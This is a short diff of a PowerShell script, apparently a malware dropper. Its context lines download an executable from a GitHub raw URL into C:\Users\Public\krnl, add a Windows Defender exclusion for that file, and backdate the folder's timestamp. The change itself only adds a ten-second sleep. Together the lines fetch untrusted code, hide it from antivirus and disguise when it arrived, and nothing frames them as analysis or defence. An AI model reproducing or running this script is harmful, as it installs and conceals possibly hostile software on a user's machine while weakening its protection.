@@ -2,6 +2,8 @@ New-Item -ItemType Directory -Path C:\Users\Public\krnl
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl-debug.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
+Start-Sleep -Seconds 10
+
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:23:09")
